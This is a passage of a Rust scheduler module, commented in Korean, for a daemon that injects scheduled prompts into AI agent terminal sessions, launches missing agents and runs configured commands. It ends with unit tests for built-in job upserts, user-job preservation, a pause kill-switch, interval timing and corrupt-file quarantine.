            .ok_or("fresh job requires 'launch' spec")?;
        let mut spec = spec.clone();
        spec.role = format!("{}-fresh-{}", spec.role, now_epoch() as u64);
        let sid = launch_via_cli(daemon, &spec).await?;
        inject(daemon, sid, text)?;
        // TTL: fresh surface 누수 차단 — 지정(또는 반복 job 기본) 시간 후 자동 close.
        // 원샷+fresh는 명시 시에만, 반복(time)+fresh는 미설정이어도 기본 TTL로 회수한다.
        if let Some(ttl) = effective_close_ttl(job) {
            let d = Arc::clone(daemon);
            tokio::spawn(async move {
                tokio::time::sleep(Duration::from_secs(ttl)).await;
                let _ = crate::governance::close_surface(&d, sid, crate::governance::CloseCause::Reap);
            });
        }
        return Ok(format!("fresh-launched and pushed (surface:{sid})"));
    }
    let mut sid = daemon.roles.lock().unwrap().get(to).copied();
    // 대상 surface가 죽어 있거나 agent-backed가 아니면(빈 셸) 부재로 간주.
    // agent_meta=None인 surface(new-surface로 만든 빈 zsh 셸)에 자연어 프롬프트를 push하면
    // 셸이 명령으로 해석해 깨진다(예: '[heartbeat]…' → zsh no matches). launch-agent로 등록된
    // 에이전트 pane만 유효 대상 → 빈 셸은 if_absent 규칙으로 처리(owner 보고는 skip).
    if let Some(s) = sid {
        let valid = daemon
            .get_surface(s)
            .map(|surf| {
                let alive = !surf.exited.load(std::sync::atomic::Ordering::Relaxed);
                let is_agent = surf.agent_meta.lock().unwrap().is_some();
                alive && is_agent
            })
            .unwrap_or(false);
        if !valid {
            sid = None;
        }
    }

    if sid.is_none() {
        // 값 정규화(trim+소문자) — JSON 직접 편집의 "Skip"·" launch "도 의도대로 처리.
        let if_absent = job
            .if_absent
            .as_deref()
            .map(|s| s.trim().to_ascii_lowercase());
        match if_absent.as_deref() {
            Some("launch") => {
                let spec = job
                    .launch
                    .as_ref()
                    .ok_or("if_absent=launch but no 'launch' spec")?;
                sid = Some(launch_via_cli(daemon, spec).await?);
            }
            // skip: 대상 역할 부재 시 조용히 건너뛴다(Ok) — 에러로 기록하지 않는다.
            // 5분 보고 하트비트처럼 master가 평시 안 떠 있을 수 있는 job이 schedule.error를
            // 매 주기 쌓는 것을 차단한다(보고 '누락'은 무해, '에러 누적'은 모니터링 오염).
            Some("skip") => return Ok(format!("skipped: role '{to}' absent (if_absent=skip)")),
            // 미설정: 의도 불명 — 기존대로 에러로 알린다(설정 누락을 숨기지 않는다).
            _ => return Err(format!("role '{to}' absent (set if_absent=launch|skip)")),
        }
    }
    let sid = sid.ok_or_else(|| format!("role '{to}' absent"))?;
    inject(daemon, sid, text)?;
    Ok(format!("pushed to {to} (surface:{sid})"))
}

/// 살아있는 세션의 stdin에 과업을 주입 (bracketed paste + Return).
/// 전체 시퀀스가 writer 스레드의 단일 Inject 항목으로 직렬화돼
/// 동시 발화·동시 배달과 섞이지 않는다 (메시지 병합·오염 차단).
fn inject(daemon: &Arc<Daemon>, sid: u64, text: &str) -> Result<(), String> {
    let surface = daemon.get_surface(sid).ok_or("surface gone")?;
    surface
        .write_tx
        .try_send(crate::state::WriteReq::Inject {
            text: text.to_string(),
            cr_delay_ms: 500,
            clear_first: false, // 스케줄 발화는 현행 동작 보존
        })
        .map_err(|e| match e {
            std::sync::mpsc::TrySendError::Full(_) => {
                "surface write channel full (pane stalled)".to_string()
            }
            std::sync::mpsc::TrySendError::Disconnected(_) => "surface writer closed".to_string(),
        })
}

/// 부재 역할 자동 기동: 데몬이 형제 CLI의 launch-agent를 호출 (준비 폴링·지침 주입 재사용)
async fn launch_via_cli(daemon: &Arc<Daemon>, spec: &LaunchSpec) -> Result<u64, String> {
    let cli = crate::state::sibling_cli_path();
    let mut cmd = tokio::process::Command::new(cli);
    cmd.arg("launch-agent")
        .arg("--role")
        .arg(&spec.role)
        .arg("--agent")
        .arg(&spec.agent)
        .env(
            cys::ENV_SOCKET,
            daemon.socket_path.to_string_lossy().as_ref(),
        );
    if let Some(cwd) = &spec.cwd {
        cmd.arg("--cwd").arg(cwd);
    }
    // hang된 launch-agent가 fire 태스크를 영구 점유하지 않게 상한
    let out = tokio::time::timeout(Duration::from_secs(180), cmd.hide_console().output())
        .await
        .map_err(|_| "launch-agent timed out (180s)".to_string())?
        .map_err(|e| format!("launch-agent spawn failed: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "launch-agent failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    // launch-agent는 마지막 줄에 surface ref를 출력한다
    let sid = String::from_utf8_lossy(&out.stdout)
        .lines()
        .rev()
        .find_map(|l| aiterm_parse(l.trim()))
        .ok_or("launch-agent did not print a surface ref")?;
    Ok(sid)
}

fn aiterm_parse(s: &str) -> Option<u64> {
    cys::parse_surface_ref(s)
}

/// 플랫폼별 셸 호출자 (program, flag). Windows에는 `sh`가 PATH에 없어
/// 발화가 ErrorKind::NotFound로 즉시 실패하므로 cmd.exe로 분기한다.
/// 데몬의 default_shell/create_surface와 동일한 cfg(windows) 비대칭 해소.
fn command_shell() -> (&'static str, &'static str) {
    #[cfg(windows)]
    {
        ("cmd", "/C")
    }
    #[cfg(not(windows))]
    {
        ("sh", "-c")
    }
}

async fn fire_command(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
    let command = job
        .command
        .as_deref()
        .ok_or("command job missing 'command'")?;
    let (shell, flag) = command_shell();
    let out = tokio::time::timeout(
        Duration::from_secs(600),
        tokio::process::Command::new(shell)
            .arg(flag)
            .arg(command)
            .hide_console()
            .output(),
    )
    .await
    .map_err(|_| "command timed out (600s)".to_string())?
    .map_err(|e| e.to_string())?;
    daemon.bus.publish(
        "schedule.command_done",
        "schedule",
        None,
        json!({"job_id": job.id, "exit": out.status.code(),
               "stdout_tail": String::from_utf8_lossy(&out.stdout).chars().rev().take(400).collect::<String>().chars().rev().collect::<String>()}),
    );
    Ok(format!("command exit={:?}", out.status.code()))
}

/// CLI `schedule list`용: jobs + last_fired 스냅샷
pub fn status(daemon: &Daemon) -> serde_json::Value {
    let jobs = load_jobs();
    let state = load_state(daemon);
    json!({
        "schedule_path": schedule_path().to_string_lossy(),
        "jobs": jobs,
        "last_fired": state.last_fired,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::NaiveDate;
    use std::sync::atomic::{AtomicU64, Ordering};

    /// 테스트 전용 격리 데몬 — 고유 하위 디렉터리에 소켓을 둬 병렬 실행 시 상태가 섞이지 않게 한다.
    fn test_daemon() -> Arc<Daemon> {
        static SEQ: AtomicU64 = AtomicU64::new(0);
        let dir = std::env::temp_dir().join(format!(
            "cys-sched-test-{}-{}-{}",
            std::process::id(),
            now_epoch().to_bits(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ));
        let _ = std::fs::create_dir_all(&dir);
        Daemon::new(dir.join("cysd.sock"))
    }

    // ★B2-1(W3): built-in 잡 부트 ensure idempotency — 부재 생성·재실행 무접촉(중복 0)·구버전 갱신·사용자 잡 보존.
    #[test]
    fn builtin_jobs_ensure_idempotent_and_versioned() {
        // 사용자 잡 1개로 시작(cys schedule add 시뮬).
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "user-custom-job", "every_minutes": 30, "action": "push", "to": "master"
        })];

        // 1차: built-in 5개(phoenix2 + learn2 + queue1) 생성 → changed=true.
        let (c1, conf1) = apply_builtin_jobs(&mut jobs);
        assert!(c1, "1차 ensure 는 built-in 잡을 생성해야 한다");
        assert!(conf1.is_empty(), "conflict 없음(예약 id 미선점)");
        let ids: Vec<&str> = jobs.iter().filter_map(|j| j["id"].as_str()).collect();
        assert!(ids.contains(&"phoenix-snapshot-6h") && ids.contains(&"phoenix-drill-weekly"));
        assert!(
            ids.contains(&"learn-ttl-audit") && ids.contains(&"fleet-digest"),
            "learn gaps C12③ 잡 2종 생성"
        );
        assert!(
            ids.contains(&"deadletter-transcribe-6h"),
            "★B4: dead-letter 전사 잡이 없으면 javis_deadletter 는 호출자 0 상태 그대로다"
        );
        assert!(
            ids.contains(&"formation-ensure-10min"),
            "★배송 수리: 편성 재시도 잡이 built-in 이 아니면 user-owned schedule.json 탓에 기존 사용자에게 영영 도달하지 않는다"
        );
        assert!(ids.contains(&"user-custom-job"), "사용자 잡은 보존돼야 한다");
        assert_eq!(jobs.len(), 7, "사용자1 + built-in6");
        // 주기 정합(typed): snapshot=6h(360), drill=7일(10080), audit=일(1440), digest=7일(10080).
        let period = |id: &str| {
            jobs.iter()
                .find(|j| j["id"].as_str() == Some(id))
                .and_then(|j| j["every_minutes"].as_u64())
        };
        assert_eq!(period("phoenix-snapshot-6h"), Some(360), "snapshot 6h");
        assert_eq!(period("phoenix-drill-weekly"), Some(10080), "drill 7일");
        assert_eq!(period("learn-ttl-audit"), Some(1440), "learn audit 일 1회");
        assert_eq!(period("fleet-digest"), Some(10080), "fleet digest 주 1회");
        assert_eq!(period("deadletter-transcribe-6h"), Some(360), "dead-letter 전사 6h");
        assert_eq!(period("formation-ensure-10min"), Some(10), "편성 재시도 10분");
        // 편성 잡은 command 액션(형 정합) + 주기 잡이므로 강제 표면화 금지(붙으면 매 틱 토스트 스팸).
        let formation = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("formation-ensure-10min"))
            .unwrap();
        assert_eq!(formation["action"].as_str(), Some("command"), "편성 잡=command 액션");
        let fcmd = formation["command"].as_str().expect("command 필드");
        assert!(fcmd.contains("javis_formation.py") && fcmd.contains("ensure"), "편성 ensure 호출: {fcmd}");
        assert!(
            !fcmd.contains("--force-surface"),
            "주기 잡에 강제 표면화가 붙으면 스팸 억제(전이 시에만)가 무력화된다: {fcmd}"
        );
        assert_eq!(formation["if_absent"].as_str(), Some("skip"), "대상 부재 시 skip");

        // 2차: 동버전 재실행 → 무접촉(changed=false·중복 0).
        let (c2, _) = apply_builtin_jobs(&mut jobs);
        assert!(!c2, "동버전 재실행은 무접촉(변경 없음)이어야 한다");
        assert_eq!(
            jobs.iter().filter(|j| j["id"].as_str() == Some("formation-ensure-10min")).count(),
            1,
            "편성 잡 재실행 중복 생성 0(멱등)"
        );
        let snap_count = jobs
            .iter()
            .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .count();
        assert_eq!(snap_count, 1, "재실행에도 중복 생성 0");
        assert_eq!(jobs.len(), 7, "중복 없이 7개 유지");

        // 3차: 구버전(마커=0) 항목이 있으면 갱신(교체) → changed=true, 여전히 중복 0.
        for j in jobs.iter_mut() {
            if j["id"].as_str() == Some("phoenix-snapshot-6h") {
                j["_builtin_version"] = json!(0); // 구버전 강제
                j["every_minutes"] = json!(99999); // 사용자가 못 고치는 드리프트 시뮬
            }
        }
        let (c3, _) = apply_builtin_jobs(&mut jobs);
        assert!(c3, "구버전 항목은 갱신돼야 한다");
        let refreshed = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .unwrap();
        assert_eq!(
            refreshed["_builtin_version"].as_u64(),
            Some(BUILTIN_JOBS_VERSION),
            "버전업 갱신"
        );
        assert_eq!(
            refreshed["every_minutes"].as_u64(),
            Some(360),
            "갱신은 코드 정의(360)로 복원 — 드리프트 치유"
        );
        assert_eq!(
            jobs.iter()
                .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
                .count(),
            1,
            "갱신 후에도 중복 0"
        );
    }

    /// ★배송 경로 핀(2026-07-26): 편성 재시도 잡이 **기존 사용자 파일**에 도달하는가.
    /// 팩 schedule.json 은 user-owned(`cys pack-ownership schedule.json` = user)라 팩 업데이트가
    /// 절대 덮지 않는다 — 즉 팩 파일에만 추가하면 기존 사용자에게 영영 배달되지 않는다. 유일한
    /// 배송 경로는 데몬 부트의 built-in upsert(main.rs `schedule::ensure_builtin_jobs()`)다.
    /// 여기서는 "커스터마이즈된 기존 사용자 파일(8잡)" 을 시뮬해 ①편성 잡 신규 주입(append 경로 —
    /// **버전 대조 없이** 부재만으로 생성) ②사용자 잡 무손실 ③id 유일·중복 0 ④2차 무접촉을 못박는다.
    #[test]
    fn formation_job_reaches_existing_user_file_via_builtin_upsert() {
        // built-in id 는 코드 정의 안에서 유일해야 upsert 가 결정론적이다(중복이면 마지막이 이긴다).
        let defs = builtin_jobs();
        let mut seen: Vec<&str> = defs.iter().filter_map(|j| j["id"].as_str()).collect();
        let n = seen.len();
        seen.sort_unstable();
        seen.dedup();
        assert_eq!(seen.len(), n, "built-in 잡 id 중복 — upsert 비결정론");

        // 기존 사용자 파일 시뮬: 사용자 잡 3개(그중 1개는 사용자가 주기를 고친 커스터마이즈) +
        // 현행 버전 built-in 마커 잡 5개 = 8잡. 편성 잡은 **없다**(팩 배달이 user-owned 벽에 막혔으므로).
        let mut jobs: Vec<serde_json::Value> = vec![
            json!({"id": "owner-progress-gate-5min", "every_minutes": 5, "action": "command",
                   "command": "echo user"}),
            json!({"id": "my-custom-report", "every_minutes": 77, "action": "push", "to": "master",
                   "text": "USER TEXT"}),
            json!({"id": "content-channel-health-watch", "every_minutes": 720, "action": "push",
                   "to": "master"}),
        ];
        for b in builtin_jobs() {
            if b["id"].as_str() == Some("formation-ensure-10min") {
                continue; // 기존 사용자에겐 아직 없는 잡
            }
            jobs.push(b.clone()); // 이미 배달된 built-in(현행 버전 그대로)
        }
        assert_eq!(jobs.len(), 8, "시뮬 전제: 사용자3 + 기배달 built-in5");

        let (changed, conflicts) = apply_builtin_jobs(&mut jobs);
        assert!(changed, "편성 잡 신규 주입(append)으로 changed 여야 한다");
        assert!(conflicts.is_empty(), "마커 일치 항목은 conflict 아님: {conflicts:?}");
        assert_eq!(jobs.len(), 9, "사용자3 + built-in6 = 9(편성 잡 1개만 신규 추가)");
        let formation = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("formation-ensure-10min"))
            .expect("편성 잡이 기존 사용자 파일에 주입돼야 한다(배송 경로 = built-in upsert)");
        assert_eq!(formation["_builtin"].as_str(), Some("formation"));
        assert_eq!(formation["_builtin_version"].as_u64(), Some(BUILTIN_JOBS_VERSION));
        // 사용자 커스터마이즈 무손실(예약 id 아닌 잡은 무접촉).
        let custom = jobs.iter().find(|j| j["id"].as_str() == Some("my-custom-report")).unwrap();
        assert_eq!(custom["every_minutes"].as_u64(), Some(77), "사용자 잡 보존");
        assert_eq!(
            jobs.iter()
                .find(|j| j["id"].as_str() == Some("content-channel-health-watch"))
                .unwrap()["every_minutes"]
                .as_u64(),
            Some(720),
            "마커 없는 사용자 커스터마이즈 잡 보존(built-in 아님)"
        );
        // built-in 잡은 전부 현행 버전 마커를 유지한다.
        for j in jobs.iter() {
            if j.get("_builtin").is_some() {
                assert_eq!(
                    j["_builtin_version"].as_u64(),
                    Some(BUILTIN_JOBS_VERSION),
                    "built-in 잡 버전 마커: {}",
                    j["id"]
                );
            }
        }
        let (again, _) = apply_builtin_jobs(&mut jobs);
        assert!(!again, "2차 ensure 는 무접촉(멱등)");
        assert_eq!(jobs.len(), 9, "재실행에도 중복 0");
    }

    /// ★부수피해 회귀 핀(2026-07-26 적대적 성찰): **신규 built-in 잡 도입이 기존 built-in 잡을
    /// 교체하지 않는다.**
    /// 배경(실제로 저지른 결함): 편성 잡을 추가하며 BUILTIN_JOBS_VERSION 을 1→2 로 올렸는데,
    /// 배송(append)은 버전을 보지 않으므로 그 상향은 **불필요**했고 대가만 있었다 — 기존 built-in
    /// 5종이 전부 `cur_ver != want_ver` 로 판정돼 사용자 파일에서 통째로 교체되고, 사용자가 손댄
    /// 주기·필드가 조용히 소실된다(이 프로젝트가 근절 중인 '사용자 의도 무언 파괴' 결함 유형).
    /// ⚠fixture 는 **현장에 이미 배달된 버전(DEPLOYED_VERSION 리터럴)** 으로 고정한다 —
    ///   BUILTIN_JOBS_VERSION 상수로 fixture 를 만들면 상수를 올려도 양변이 함께 움직여 결함을
    ///   못 잡는 tautology 가 된다(실제로 1차 작성본이 그랬고, 주입 실험에서 통과해 버렸다).
    /// ※ 진짜 정의 변경으로 버전을 올릴 때는 이 테스트가 의도적으로 걸린다 — 그때는 "기존 잡 교체가
    ///   의도된 변경인가"를 사람이 판단하고 리터럴을 갱신하라는 신호다(무의식적 상향 차단이 목적).
    #[test]
    fn new_builtin_job_does_not_replace_existing_builtin_jobs() {
        /// 사용자 파일에 이미 배달돼 있는 built-in 잡의 버전(현장 값 — 코드 상수와 독립된 리터럴).
        const DEPLOYED_VERSION: u64 = 1;
        // 사용자가 기존 built-in 잡의 주기를 손댄 파일(마커·버전은 그대로 = 우리 소유로 인식됨).
        // 신규 잡(formation)은 아직 없다 — "잡 추가" 상황의 정확한 재현.
        const TWEAKED: u64 = 720; // 사용자가 6h → 12h 로 늘림
        let mut jobs: Vec<serde_json::Value> = Vec::new();
        for b in builtin_jobs() {
            if b["id"].as_str() == Some("formation-ensure-10min") {
                continue;
            }
            let mut j = b.clone();
            j["_builtin_version"] = json!(DEPLOYED_VERSION); // 현장 파일의 버전(코드 상수와 무관)
            if j["id"].as_str() == Some("phoenix-snapshot-6h") {
                j["every_minutes"] = json!(TWEAKED);
            }
            jobs.push(j);
        }
        let before: Vec<serde_json::Value> = jobs.clone();

        let (changed, conflicts) = apply_builtin_jobs(&mut jobs);
        assert!(changed, "신규 built-in 잡은 append 돼야 한다");
        assert!(conflicts.is_empty(), "마커 일치 항목은 conflict 아님: {conflicts:?}");

        // ① 신규 잡은 도달한다(배송은 버전과 무관한 append 경로).
        assert!(
            jobs.iter().any(|j| j["id"].as_str() == Some("formation-ensure-10min")),
            "신규 built-in 잡이 append 되지 않았다"
        );
        // ② 기존 built-in 잡은 **한 글자도** 바뀌지 않는다 — 사용자가 손댄 값 포함.
        let snap = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .unwrap();
        assert_eq!(
            snap["every_minutes"].as_u64(),
            Some(TWEAKED),
            "사용자가 손댄 기존 built-in 잡의 주기가 코드 정의로 되돌려졌다 — \
             불필요한 BUILTIN_JOBS_VERSION 상향이 사용자 의도를 무언 파괴한다"
        );
        for old in &before {
            let id = old["id"].as_str().unwrap();
            let now = jobs.iter().find(|j| j["id"].as_str() == Some(id)).unwrap();
            assert_eq!(old, now, "기존 built-in 잡 '{id}' 이 신규 잡 도입으로 교체됐다");
        }
        assert_eq!(jobs.len(), before.len() + 1, "추가는 정확히 신규 1건(그 외 무접촉)");
    }

    // ★codex W3 major: 사용자가 예약 id(phoenix-snapshot-6h)를 마커 없이 선점하면 built-in ensure 가
    //   교체하지 않고 보존+conflict 경고해야 한다(B2-1 사용자 잡 보존 계약).
    #[test]
    fn builtin_ensure_preserves_user_job_on_reserved_id() {
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "phoenix-snapshot-6h",           // 사용자가 예약 id 선점(_builtin 마커 없음)
            "every_minutes": 5, "action": "push", "to": "master", "text": "USER OWN SNAPSHOT"
        })];
        let (changed, conflicts) = apply_builtin_jobs(&mut jobs);
        // snapshot id 는 conflict 로 보존, drill 은 신규 생성.
        assert!(conflicts.contains(&"phoenix-snapshot-6h".to_string()), "예약 id 충돌 보고");
        let snap = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .unwrap();
        assert_eq!(snap["text"].as_str(), Some("USER OWN SNAPSHOT"), "사용자 잡 내용 보존(교체 금지)");
        assert_eq!(snap["every_minutes"].as_u64(), Some(5), "사용자 주기 보존");
        assert!(snap.get("_builtin").is_none(), "사용자 잡에 built-in 마커 미주입");
        assert_eq!(
            jobs.iter().filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h")).count(),
            1,
            "충돌 id 중복 생성 0"
        );
        // drill 은 마커 없는 선점이 없으므로 정상 생성(changed=true).
        assert!(changed, "drill 신규 생성으로 changed");
        assert!(jobs.iter().any(|j| j["id"].as_str() == Some("phoenix-drill-weekly")));
    }

    /// (learn gaps C12③) pack seed(cysjavis-pack/schedule.json)의 마커 잡 ↔ builtin_jobs()
    /// 코드 정의 동기 핀 — 드리프트하면 R-CLI-4 게이트가 seed 사본 text_command 를 거부해
    /// 잡이 무음 실패한다(산문→코드 대칭 핀). learn 잡 2종 등재도 함께 박제.
    #[test]
    fn pack_seed_marked_jobs_match_builtin_defs() {
        let seed: serde_json::Value =
            serde_json::from_str(include_str!("../../../cysjavis-pack/schedule.json"))
                .expect("seed schedule.json 파싱");
        let builtins = builtin_jobs();
        let mut checked = 0;
        for j in seed["jobs"].as_array().expect("seed jobs 배열") {
            if j.get("_builtin").is_none() {
                continue; // 마커 없는 seed 잡(owner-report 등)은 코드 소유가 아니다
            }
            let id = j["id"].as_str().unwrap_or("?");
            let b = builtins
                .iter()
                .find(|b| b.get("id") == j.get("id"))
                .unwrap_or_else(|| panic!("seed 마커 잡 '{id}' 이 builtin_jobs() 에 없음"));
            assert_eq!(j, b, "seed '{id}' ↔ builtin_jobs() 정의 드리프트");
            checked += 1;
        }
        assert!(checked >= 3, "learn 잡 2종 + dead-letter 전사 잡이 seed 에 등재돼야 한다");
        // R-CLI-4: 코드 소유 text_command 는 게이트가 신뢰해야 발화된다.
        // ★B4: deadletter-transcribe-6h 는 자구가 1글자만 어긋나도 매 실행 거부된다(조용한 무동작).
        for id in ["learn-ttl-audit", "fleet-digest", "deadletter-transcribe-6h"] {
            let cmd = builtins
                .iter()
                .find(|b| b["id"].as_str() == Some(id))
                .and_then(|b| b["text_command"].as_str())
                .expect("text_command 존재");
            assert!(is_trusted_builtin_text_command(cmd), "'{id}' text_command 게이트 신뢰");
        }
    }

    #[test]
    fn run_now_is_frozen_while_paused() {
        // 회귀 가드 (T4-15 kill-switch 비대칭 차단): pause 중이면 run_now도 발화하지 않아야 한다.
        // scheduler_tick·deliver_queued는 paused에서 즉시 return하는데, run_now만 게이트가 없으면
        // 누구든 `cys schedule run-now <id>`로 kill-switch를 우회해 정지된 에이전트 stdin에
        // 과업을 주입(또는 fresh surface 기동)할 수 있다. 게이트는 job 조회·fire spawn보다
        // 먼저 막아야 한다 — 존재하지 않는 job id를 줘도 'paused' 거절이 먼저 와야 한다.
        let daemon = test_daemon();
        daemon.paused.store(true, Ordering::Relaxed);
        let err = run_now(&daemon, "no-such-job-xyz")
            .expect_err("paused 중 run_now는 발화를 거절(Err)해야 한다");
        assert!(
            err.contains("paused"),
            "거절 사유는 kill-switch(paused)여야 한다 — got: {err}"
        );
    }

    #[test]
    fn run_now_passes_gate_when_not_paused() {
        // 대칭 확인: pause가 아니면 게이트를 통과해 정상 조회 경로로 진행한다(여기선 job 부재 →
        // 'no job' 에러). paused 에러가 아니어야 게이트가 정상(running)임이 증명된다.
        let daemon = test_daemon();
        assert!(!daemon.paused.load(Ordering::Relaxed));
        let err = run_now(&daemon, "no-such-job-xyz")
            .expect_err("부재 job은 'no job' 에러여야 한다");
        assert!(
            !err.contains("paused"),
            "running 상태에서 paused 게이트가 잘못 발동하면 안 된다 — got: {err}"
        );
        assert!(err.contains("no job"), "게이트 통과 후 조회 경로 에러여야 한다 — got: {err}");
    }

    fn job(time: Option<&str>, days: &[&str]) -> Job {
        Job {
            id: "t".into(),
            time: time.map(|s| s.to_string()),
            every_minutes: None,
            at: None,
            close_after_secs: None,
            days: days.iter().map(|s| s.to_string()).collect(),
            action: "push".into(),
            to: None,
            text: None,
            text_command: None,
            command: None,
            if_absent: None,
            fresh: false,
            launch: None,
        }
    }

    /// ★불변식 박제 (절대지침 — master 5분 주기 보고 하트비트):
    /// interval_due는 마지막 발화 후 every_minutes분 경과 시에만 true. 0·None은 비활성.
    #[test]
    fn interval_due_fires_every_n_minutes() {
        let base = 1_000_000_000i64; // 임의 epoch
        // 5분 주기: 마지막 발화 직후엔 false, 정확히 300초 경과 시 true
        assert!(!interval_due(Some(5), base, base));
        assert!(!interval_due(Some(5), base, base + 299));
        assert!(interval_due(Some(5), base, base + 300));
        assert!(interval_due(Some(5), base, base + 600));
        // 최초(last_fired=0)는 즉시 발화 (epoch 차가 간격보다 큼)
        assert!(interval_due(Some(5), 0, base));
        // 비활성: None·0은 항상 false (상시발화 방지)
        assert!(!interval_due(None, 0, base));
        assert!(!interval_due(Some(0), 0, base));
    }

    #[test]
    fn schedule_for_daily_when_no_days() {
        // days 비면 매일 발화 — 임의 날짜에 Some
        let j = job(Some("09:00"), &[]);
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        assert!(schedule_for(&j, d).is_some());
    }

    #[test]
    fn schedule_for_respects_weekday_filter() {
        // 2026-06-12는 금요일(Friday)
        let friday = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        assert_eq!(friday.weekday(), chrono::Weekday::Fri);
        // 금요일 포함 → Some
        assert!(schedule_for(&job(Some("09:00"), &["fri"]), friday).is_some());
        // 대소문자 무관 매칭
        assert!(schedule_for(&job(Some("09:00"), &["FRI"]), friday).is_some());
        // 다른 요일만 지정 → None
        assert!(schedule_for(&job(Some("09:00"), &["mon", "tue"]), friday).is_none());
    }

    #[test]
    fn schedule_for_invalid_or_missing_time() {
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        // time 미제공 → None (원샷 at job이 아닌 한 발화 불가)
        assert!(schedule_for(&job(None, &[]), d).is_none());
        // 잘못된 시각 포맷 → None
        assert!(schedule_for(&job(Some("9am"), &[]), d).is_none());
        assert!(schedule_for(&job(Some("25:00"), &[]), d).is_none());
        assert!(schedule_for(&job(Some("12:60"), &[]), d).is_none());
    }

    #[test]
    fn schedule_for_time_ordering_within_day() {
        // 같은 날 더 늦은 시각은 더 큰(또는 같은) epoch — 단조성
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        let early = schedule_for(&job(Some("08:00"), &[]), d).unwrap();
        let late = schedule_for(&job(Some("20:00"), &[]), d).unwrap();
        assert!(late > early);
    }

    #[test]
    fn recurring_fresh_without_ttl_gets_default_reap() {
        // 회귀 가드: 반복(time) + fresh + close_after_secs 미설정 job은 발화마다 유일 역할의
        // 새 surface를 만든다. 회수 트리거가 없으면 24/365 데몬에서 surface·roles·fd가
        // 단조 증가(누수)한다. effective_close_ttl이 기본 TTL을 부여해 회수를 보장해야 한다.
        let mut j = job(Some("09:00"), &[]);
        j.fresh = true;
        assert_eq!(
            effective_close_ttl(&j),
            Some(FRESH_RECURRING_DEFAULT_TTL_SECS),
            "반복 fresh job이 TTL 없이 누수되면 안 된다 — 기본 TTL로 회수돼야 한다"
        );
        // every_minutes 반복 fresh job도 동일하게 기본 TTL을 받아야 한다(at None인 반복형).
        let mut e = job(None, &[]);
        e.every_minutes = Some(5);
        e.fresh = true;
        assert_eq!(
            effective_close_ttl(&e),
            Some(FRESH_RECURRING_DEFAULT_TTL_SECS),
            "every_minutes fresh job도 누수 차단 기본 TTL을 받아야 한다"
        );
    }

    #[test]
    fn explicit_close_after_secs_takes_precedence() {
        // 운영자가 명시한 close_after_secs는 항상 우선 (반복·원샷 무관, 0도 존중)
        let mut recurring = job(Some("09:00"), &[]);
        recurring.fresh = true;
        recurring.close_after_secs = Some(42);
        assert_eq!(effective_close_ttl(&recurring), Some(42));

        let mut oneshot = job(None, &[]);
        oneshot.at = Some(1_900_000_000);
        oneshot.fresh = true;
        oneshot.close_after_secs = Some(7);
        assert_eq!(effective_close_ttl(&oneshot), Some(7));

        // 0 = 즉시 close 의도 — 기본값으로 덮어쓰지 않는다
        recurring.close_after_secs = Some(0);
        assert_eq!(effective_close_ttl(&recurring), Some(0));
    }

    #[test]
    fn oneshot_fresh_without_ttl_keeps_legacy_none() {
        // 원샷(at)+fresh는 1회뿐이라 무한 누적이 없다 — 기존 동작(자동 close 없음) 보존.
        // 반복 경로만 누수이므로 수정은 반복에 국한한다(외과적 최소 변경).
        let mut oneshot = job(None, &[]);
        oneshot.at = Some(1_900_000_000);
        oneshot.fresh = true;
        assert_eq!(effective_close_ttl(&oneshot), None);
    }

    #[test]
    fn corrupt_persistence_is_quarantined_not_silently_dropped() {
        // 회귀 가드 (W0-3): 존재하나 파싱 불가한 영속 파일은 조용히 기본값으로 대체되지 않고
        // 손상본이 <name>.corrupt-<epoch>로 격리돼야 한다(24/365 데몬의 하트비트·fire-state
        // 무음 소실 차단 — 헌장 복원 불변식). schedule_path()는 pack_dir 고정이라 핵심
        // 격리 동작인 quarantine_corrupt를 직접 검증한다.
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "cys-sched-corrupt-{}-{}",
            std::process::id(),
            now_epoch().to_bits()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("schedule.json");
        std::fs::File::create(&p)
            .unwrap()
            .write_all(b"{ this is not valid json ]")
            .unwrap();
        let backup = quarantine_corrupt(&p).expect("손상 파일은 격리(rename)돼야 한다");
        assert!(backup.exists(), "격리 백업 파일이 존재해야 한다(데이터 보존)");
        assert!(!p.exists(), "원본 손상 파일은 이동돼 자리에 남지 않아야 한다");
        assert!(
            backup.file_name().unwrap().to_string_lossy().contains(".corrupt-"),
            "백업 이름에 .corrupt- 표식이 있어야 한다"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn schedule_state_is_versioned_and_additive() {
        // schema_version 도입은 추가-전용 — 구파일(필드 부재)도 default 0으로 로드돼야 하고
        // (마이그레이션 호환), 신규 직렬화는 현재 버전을 실어야 한다.
        let old: ScheduleState =
            serde_json::from_str(r#"{"last_fired":{"j":5}}"#).expect("구파일도 로드돼야 함");
        assert_eq!(old.schema_version, 0, "구파일은 schema_version 0으로 로드(추가-전용)");
        assert_eq!(old.last_fired.get("j"), Some(&5));
        let mut s = ScheduleState::default();
        s.schema_version = SCHEDULE_STATE_VERSION;
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("schema_version"), "직렬화는 schema_version을 실어야 한다");
        let back: ScheduleState = serde_json::from_str(&json).unwrap();
        assert_eq!(back.schema_version, SCHEDULE_STATE_VERSION);
    }

